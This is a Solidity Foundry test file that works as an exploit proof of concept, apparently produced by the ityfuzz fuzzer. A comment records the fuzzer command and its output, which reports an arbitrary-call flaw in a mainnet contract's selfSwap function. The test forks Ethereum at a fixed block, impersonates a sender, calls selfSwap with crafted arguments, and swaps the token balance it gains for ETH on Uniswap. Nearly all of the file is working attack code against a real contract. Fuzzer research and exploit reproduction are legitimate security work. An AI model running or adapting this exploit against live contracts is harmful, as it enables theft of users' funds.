// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0xDE62E1b0edAa55aAc5ffBE21984D321706418024,0x58f5F0684C381fCFC203D77B2BbA468eBb29B098,0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,0x4C19596f5aAfF459fA38B0f7eD92F11AE6543784 -c eth --onchain-block-number 16646023 -f -i -p --onchain-etherscan-api-key $ETH_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
Arbitrary call from "0xde62e1b0edaa55aac5ffbe21984d321706418024" to 0x0000000000000000000000000000000000000000
================ Trace ================
[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   ├─[1] 0xDE62E1b0edAa55aAc5ffBE21984D321706418024.selfSwap((0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, (0, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2), (0, 0xdAC17F958D2ee523a2206206994597C13D831ec7), ((0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, (0, 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D), 0xa67fffffff0ef911f9f701b100f5f7ee8021f6a5), (0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, (0, 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D), 0xa67fffffff0ef911f9f701b100f5f7ee8021f6a5), (0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, (0, 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D), 0xa67fffffff0ef911f9f701b100f5f7ee8021f6a5), (0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, (0, 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D), 0xa67fffffff0ef911f9f701b100f5f7ee8021f6a5), (0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, (0, 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D), 0xa67fffffff0ef911f9f701b100f5f7ee8021f6a5), (0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, (0, 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D), 0xa67fffffff0ef911f9f701b100f5f7ee8021f6a5))))
   │  ├─[2] [Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd.fallback()
   ├─[1] Router.swapExactTokensForETH(100% Balance, 0, path:(0xDE62E1b0edAa55aAc5ffBE21984D321706418024 → WETH), address(this), block.timestamp);
   │  │  └─ ← ()
   │  │  ├─[2] Router.swapExactTokensForETH(100% Balance, 0, path:(0x9db83CEf9f68b63989E4E82D65D549e7fF2aCda9 → WETH), address(this), block.timestamp);
   │  │  └─ ← ()
   │  │  └─ ← ()
   │  │  └─ ← ()
   │  │  └─ ← ()
   │  │  └─ ← ()
   │  │  └─ ← ()
   │  │  └─ ← ()
   │  │  └─ ← ()
   │  │  └─ ← ()
   │  │  └─ ← ()
   │  │  └─ ← ()
   │  │  └─ ← ()
   │  │  └─ ← ()


 */

contract CDE62 is Test {
    function setUp() public {
        vm.createSelectFork("eth", 16646023);
    }

    function test() public {
        address router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        
        0xDE62E1b0edAa55aAc5ffBE21984D321706418024.call(abi.encodeWithSignature(
            "selfSwap((address,(uint112,address),(uint112,address),(address,address,(uint112,address),bytes)[]))",[0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, [0, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [0, 0xdAC17F958D2ee523a2206206994597C13D831ec7], [[0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, [0, 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 0xa67fffffff0ef911f9f701b100f5f7ee8021f6a5], [0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, [0, 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 0xa67fffffff0ef911f9f701b100f5f7ee8021f6a5], [0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, [0, 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 0xa67fffffff0ef911f9f701b100f5f7ee8021f6a5], [0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, [0, 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 0xa67fffffff0ef911f9f701b100f5f7ee8021f6a5], [0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, [0, 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 0xa67fffffff0ef911f9f701b100f5f7ee8021f6a5], [0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, [0, 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 0xa67fffffff0ef911f9f701b100f5f7ee8021f6a5]]]
        )); 
        vm.startPrank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        uint256 amount0 = IERC20(0xDE62E1b0edAa55aAc5ffBE21984D321706418024).balanceOf(address(this));
        IERC20(0xDE62E1b0edAa55aAc5ffBE21984D321706418024).approve(router, amount0);
        address[] memory liq_path0 = new address[](2);
        liq_path0[0] = 0xDE62E1b0edAa55aAc5ffBE21984D321706418024;
        liq_path0[1] = address(weth);
        vm.deal(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, amount0);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount0, 0, liq_path0, address(this), block.timestamp
        );
        vm.stopPrank();
    }

    // Stepping with return
    receive() external payable {}
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
